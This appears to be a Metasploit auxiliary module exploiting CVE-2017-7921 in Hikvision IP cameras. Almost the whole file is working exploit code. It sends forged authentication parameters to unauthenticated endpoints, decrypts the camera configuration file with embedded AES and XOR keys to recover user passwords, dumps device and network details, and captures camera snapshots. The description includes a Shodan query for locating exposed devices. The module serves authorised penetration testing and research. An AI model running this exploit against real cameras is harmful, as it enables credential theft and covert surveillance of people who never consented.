##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  require 'openssl'

  prepend Msf::Exploit::Remote::AutoCheck

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  # AES hex encryption key and XOR key defined constants used to decrypt the camare configuration file
  AES_KEY = '279977f62f6cfd2d91cd75b889ce0c9a'.freeze
  XOR_KEY = "\x73\x8b\x55\x44".freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Unauthenticated information disclosure such as configuration, credentials and camera snapshots of a vulnerable Hikvision IP Camera',
        'Description' => %q{
          Many Hikvision IP cameras have improper authorization logic that allows unauthenticated information disclosure of camera information,
          such as detailed hardware and software configuration, user credentials, and camera snapshots.
          The vulnerability has been present in Hikvision products since 2014.
          In addition to Hikvision-branded devices, it affects many white-labeled camera products sold under a variety of brand names.
          Hundreds of thousands of vulnerable devices are still exposed to the Internet at the time of publishing (shodan search: "App-webs" "200 OK").
          This module allows the attacker to retrieve this information without any authentication. The information is stored in loot for future use.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Monte Crypto', # Researcher who discovered and disclosed this vulnerability
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Developer and author of this Metasploit module
        ],
        'References' => [
          [ 'CVE', '2017-7921' ],
          [ 'PACKETSTORM', '144097' ],
          [ 'URL', 'https://ipvm.com/reports/hik-exploit' ],
          [ 'URL', 'https://attackerkb.com/topics/PlLehGSmxT/cve-2017-7921' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2017/Sep/23' ]
        ],
        'Actions' => [
          ['Automatic', { 'Description' => 'Dump all information' }],
          ['Credentials', { 'Description' => 'Dump all credentials and passwords' }],
          ['Configuration', { 'Description' => 'Dump camera hardware and software configuration' }],
          ['Snapshot', { 'Description' => 'Take a camera snapshot' }]
        ],
        'DefaultAction' => 'Automatic',
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false
        },
        'DisclosureDate' => '2017-09-23',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptBool.new(
        'PRINT',
        [
          false,
          'Print output to console (not applicable for snapshot)',
          true
        ]
      )
    ])
  end

  def get_info(uri)
    password = Rex::Text.rand_text_alphanumeric(4..12)
    auth = Base64.urlsafe_encode64("admin:#{password}", padding: false)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'vars_get' => {
        'auth' => auth.strip
      }
    })
    return res
  rescue StandardError => e
    print_error("#{peer} - Communication error occurred: #{e.message}")
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    return nil
  end

  def report_creds(user, pwd)
    credential_data = {
      module_fullname: fullname,
      username: user,
      private_data: pwd,
      private_type: :password,
      workspace_id: myworkspace_id,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_details)

    cred_res = create_credential_and_login(credential_data)
    unless cred_res.nil?
      print_status("Credentials for user:#{user} are added to the database...")
    end
  end

  def decrypt_config
    text_data = []

    # Get AES128-ECB encrypted camera configuration file with user and password information
    uri = normalize_uri(target_uri.path, 'System', 'configurationFile')
    aes_data = get_info(uri)

    if aes_data.nil?
      print_error('Target server did not respond to the configuration file download request.')
    elsif aes_data.code == 200
      # decrypt configuration file data with the weak AES128-ECB encryption hex key: 279977f62f6cfd2d91cd75b889ce0c9a
      decipher = OpenSSL::Cipher.new('aes-128-ecb')
      decipher.decrypt
      decipher.key = [AES_KEY].pack('H*') # transform hex key to 16 bits key
      xor_data = decipher.update(aes_data.body) + decipher.final

      # decode the AES decrypted configuration file data with xor key: 73 8B 55 44
      file_data = Rex::Text.xor(XOR_KEY.b, xor_data)

      # extract text chunks with regular expression below...
      text_data = file_data.scan(%r{[0-9A-Za-z_\#~`@|\\/=*\^:"'.;{}?\-+&!$%()\[\]<>]+}x)
    end
    return text_data
  end

  def get_creds
    loot_data = ''
    pwd = nil

    print_status('Getting the user credentials...')
    uri = normalize_uri(target_uri.path, 'Security', 'users')
    creds_info = get_info(uri)

    if creds_info.nil?
      print_error('Target server did not respond to the credentials request.')
    elsif creds_info.code == 200
      # process XML output and store output in loot_data
      xml_creds_info = creds_info.get_xml_document
      if xml_creds_info.blank?
        print_error('No users were found in the returned CSS code!')
      else
        # Download camera configuration file and and decrypt
        text_data = decrypt_config
        loot_data << "User Credentials Information:\n"
        loot_data << "-----------------------------\n"
        xml_creds_info.css('User').each do |user|
          unless text_data.empty?
            # Filter out password based on user name and store credentials in the database
            i = text_data.each_with_index.select { |text_chunk, _index| text_chunk == user.at_css('userName').content }.map { |pair| pair[1] }
            if i.empty?
              print_error("Could not retrieve password for user:#{user.at_css('userName').content} from the camera configuration file!")
            else
              pwd = text_data[i.last + 1]
              report_creds(user.at_css('userName').content, pwd)
            end
          end
          loot_data << "User:#{user.at_css('userName').content} | ID:#{user.at_css('id').content} | Role:#{user.at_css('userLevel').content} | Password: #{pwd}\n"
        end
      end
    else
      print_error('Response code invalid for obtaining the user credentials.')
    end
    unless loot_data.empty?
      if datastore['PRINT']
        print_status(loot_data.to_s)
      end
      loot_path = store_loot('hikvision.credential', 'text/plain', datastore['RHOSTS'], loot_data, 'credentials', 'leaked credentials')
      print_good("User credentials are successfully saved to #{loot_path}")
    end
  end

  def get_config
    loot_data = ''

    # Get device info
    print_status('Getting the camera hardware and software configuration...')
    uri = normalize_uri(target_uri.path, 'System', 'deviceInfo')
    device_info = get_info(uri)

    if device_info.nil?
      print_error('Target server did not respond to the device info request.')
    elsif device_info.code == 200
      # process XML output and store in loot_data
      xml_device_info = device_info.get_xml_document
      if xml_device_info.blank?
        print_error('No device info was found in the returned CSS code!')
      else
        loot_data << "Camera Device Information:\n"
        loot_data << "--------------------------\n"
        xml_device_info.css('DeviceInfo').each do |device|
          loot_data << "Device name: #{device.at_css('deviceName').content}\n"
          loot_data << "Device ID: #{device.at_css('deviceID').content}\n"
          loot_data << "Device description: #{device.at_css('deviceDescription').content}\n"
          loot_data << "Device manufacturer: #{device.at_css('systemContact').content}\n"
          loot_data << "Device model: #{device.at_css('model').content}\n"
          loot_data << "Device S/N: #{device.at_css('serialNumber').content}\n"
          loot_data << "Device MAC: #{device.at_css('macAddress').content}\n"
          loot_data << "Device firware version: #{device.at_css('firmwareVersion').content}\n"
          loot_data << "Device firmware release: #{device.at_css('firmwareReleasedDate').content}\n"
          loot_data << "Device boot version: #{device.at_css('bootVersion').content}\n"
          loot_data << "Device boot release: #{device.at_css('bootReleasedDate').content}\n"
          loot_data << "Device hardware version: #{device.at_css('hardwareVersion').content}\n"
        end
        loot_data << "\n"
      end
    else
      print_error('Response code invalid for obtaining camera hardware and software configuration.')
    end

    # Get network configuration
    uri = normalize_uri(target_uri.path, 'Network', 'interfaces')
    network_info = get_info(uri)

    if network_info.nil?
      print_error('Target server did not respond to the network info request.')
    elsif network_info.code == 200
      # process XML output and store in loot_data
      xml_network_info = network_info.get_xml_document
      if xml_network_info.blank?
        print_error('No network info was found in the returned CSS code!')
      else
        loot_data << "Camera Network Information:\n"
        loot_data << "---------------------------\n"
        xml_network_info.css('NetworkInterface').each do |interface|
          loot_data << "IP interface: #{interface.at_css('id').content}\n"
          xml_network_info.css('IPAddress').each do |ip|
            loot_data << "IP version: #{ip.at_css('ipVersion').content}\n"
            loot_data << "IP assignment: #{ip.at_css('addressingType').content}\n"
            loot_data << "IP address: #{ip.at_css('ipAddress').content}\n"
            loot_data << "IP subnet mask: #{ip.at_css('subnetMask').content}\n"
            xml_network_info.css('DefaultGateway').each do |gateway|
              loot_data << "Default gateway: #{gateway.at_css('ipAddress').content}\n"
            end
            xml_network_info.css('PrimaryDNS').each do |dns|
              loot_data << "Primary DNS: #{dns.at_css('ipAddress').content}\n"
            end
          end
        end
        loot_data << "\n"
      end
    else
      print_error('Response code invalid for obtaining camera network configuration.')
    end

    # Get storage configuration
    uri = normalize_uri(target_uri.path, 'System', 'Storage', 'volumes')
    storage_info = get_info(uri)

    if storage_info.nil?
      print_error('Target server did not respond to the storage info request.')
    elsif storage_info.code == 200
      # process XML output and store in loot
      xml_storage_info = storage_info.get_xml_document
      if xml_storage_info.blank?
        print_error('No storage info was found in the returned CSS code!')
      else
        loot_data << "Camera Storage Information:\n"
        loot_data << "---------------------------\n"
        xml_storage_info.css('StorageVolume').each do |volume|
          loot_data << "Storage volume name: #{volume.at_css('volumeName').content}\n"
          loot_data << "Storage volume ID: #{volume.at_css('id').content}\n"
          loot_data << "Storage volume description: #{volume.at_css('storageDescription').content}\n"
          loot_data << "Storage device: #{volume.at_css('storageLocation').content}\n"
          loot_data << "Storage type: #{volume.at_css('storageType').content}\n"
          loot_data << "Storage capacity (MB): #{volume.at_css('capacity').content}\n"
          loot_data << "Storage device status: #{volume.at_css('status').content}\n"
        end
      end
    else
      print_error('Response code invalid for obtaining camera storage configuration.')
    end
    unless loot_data.empty?
      if datastore['PRINT']
        print_status(loot_data.to_s)
      end
      loot_path = store_loot('hikvision.config', 'text/plain', datastore['RHOSTS'], loot_data, 'configuration', 'camera configuration')
      print_good("Camera configuration details are successfully saved to #{loot_path}")
    end
  end

  def take_snapshot
    jpeg_image = nil

    # Take a snapshot and store as jpeg
    print_status('Taking a camera snapshot...')
    uri = normalize_uri(target_uri.path, 'Streaming', 'channels', '1', 'picture?snapShotImageType=JPEG')
    res = get_info(uri)

    if res.nil?
      print_error('Target server did not respond to the snapshot request.')
    elsif res.code == 200
      jpeg_image = res.body
    else
      print_error('Response code invalid for obtaining a camera snapshot.')
    end
    unless jpeg_image.nil?
      loot_path = store_loot('hikvision.image', 'jpeg/image', datastore['RHOSTS'], jpeg_image, 'snapshot', 'camera snapshot')
      print_good("Camera snapshot is successfully saved to #{loot_path}")
    end
  end

  def check
    uri = normalize_uri(target_uri.path, 'System', 'time')
    res = get_info(uri)

    if res.nil?
      return Exploit::CheckCode::Unknown
    elsif res.code == 200
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    case action.name
    when 'Automatic'
      print_status('Running in automatic mode')
      get_creds
      get_config
      take_snapshot
    when 'Credentials'
      get_creds
    when 'Configuration'
      get_config
    when 'Snapshot'
      take_snapshot
    end
  end
end
